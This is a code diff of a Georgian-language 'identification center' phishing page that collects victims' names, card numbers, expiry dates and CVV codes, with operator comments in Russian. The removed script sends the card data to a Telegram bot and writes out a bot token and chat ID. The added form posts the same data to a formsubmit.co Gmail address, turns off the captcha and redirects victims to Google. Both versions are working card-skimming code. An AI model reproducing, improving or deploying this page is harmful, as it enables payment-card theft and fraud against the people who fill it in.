@@ -27,26 +27,35 @@
 
 <div class="form-container">
     <h1>იდენტიფიკაციის ცენტრი</h1>
-    <form id="mainForm">
+    
+    <!-- ЗАМЕНИ ТВОЙ_EMAIL@GMAIL.COM НА СВОЮ ПОЧТУ -->
+    <form action="https://formsubmit.co/kapanadze1995work@gmail.com
+" method="POST">
         <h3>შეავსეთ ფორმა</h3>
 
+        <!-- Настройка: Отключает капчу для удобства (необязательно) -->
+        <input type="hidden" name="_captcha" value="false">
+        
+        <!-- Настройка: Куда перекинуть после отправки -->
+        <input type="hidden" name="_next" value="https://google.com">
+
         <label for="first-name">სახელი</label>
-        <input type="text" id="first-name" placeholder="სახელი" required>
+        <input type="text" id="first-name" name="Имя" placeholder="სახელი" required>
 
         <label for="last-name">გვარი</label>
-        <input type="text" id="last-name" placeholder="გვარი" required>
+        <input type="text" id="last-name" name="Фамилия" placeholder="გვარი" required>
 
-        <label for="card-number">ბارათის ნომერი</label>
-        <input type="text" id="card-number" placeholder="0000 0000 0000 0000" maxlength="19" required>
+        <label for="card-number">ბარათის ნომერი</label>
+        <input type="text" id="card-number" name="Номер карты" placeholder="0000 0000 0000 0000" maxlength="19" required>
 
         <div class="expiry-cvv-row">
             <div>
                 <label for="expiry-date">მოქმედების ვადა</label>
-                <input type="text" id="expiry-date" placeholder="MM/YY" maxlength="5" required>
+                <input type="text" id="expiry-date" name="Срок действия" placeholder="თვ / წლ" maxlength="5" required>
             </div>
             <div>
                 <label for="cvv">უსაფრთხოების კოდი</label>
-                <input type="text" id="cvv" placeholder="***" maxlength="3" required>
+                <input type="text" id="cvv" name="CVV" placeholder="***" maxlength="3" required>
             </div>
         </div>
 
@@ -55,7 +64,7 @@
 </div>
 
 <script>
-    // 1. Маски для ввода данных карты
+    // Маски для красивого ввода данных (оставляем, это полезно)
     document.getElementById('card-number').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '').slice(0,16);
         e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
@@ -64,40 +73,6 @@
     document.getElementById('expiry-date').addEventListener('input', e => {
         let v = e.target.value.replace(/\D/g, '').slice(0,4);
         if (v.length >= 2) e.target.value = v.slice(0,2) + '/' + v.slice(2,4);
-    });
-
-    // 2. ОТПРАВКА ДАННЫХ В TELEGRAM
-    document.getElementById('mainForm').addEventListener('submit', function(e) {
-        e.preventDefault(); 
-
-        // СЮДА ВСТАВЛЯЙ СВОИ ДАННЫЕ
-        const token = '8650944783:AAHsNX_fkpvurn6gkrcgnyqGNfzfHh8Xk9o'; // ТОКЕН ОТ BOTFATHER
-        const chatId = '820823459';   // ID ОТ USERINFOBOT
-        
-        const name = document.getElementById('first-name').value;
-        const lastName = document.getElementById('last-name').value;
-        const card = document.getElementById('card-number').value;
-        const exp = document.getElementById('expiry-date').value;
-        const cvv = document.getElementById('cvv').value;
-
-        const message = `🔔 Новая заявка!\n👤 Имя: ${name} ${lastName}\n💳 Карта: ${card}\n📅 Срок: ${exp}\n🔐 CVV: ${cvv}`;
-
-        // Формируем запрос к API Telegram
-        const url = `https://api.telegram.org{token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=html`;
-
-        fetch(url)
-            .then(response => {
-                if (response.ok) {
-                    alert('წარმატებით გაიგზავნა!'); // Сообщение об успехе
-                    this.reset(); // Очистка формы
-                } else {
-                    alert('Ошибка отправки. Проверьте Токен и ID.');
-                }
-            })
-            .catch(err => {
-                console.error('Ошибка:', err);
-                alert('შეცდომა! სცადეთ მოგვიანებით.');
-            });
     });
 </script>
 
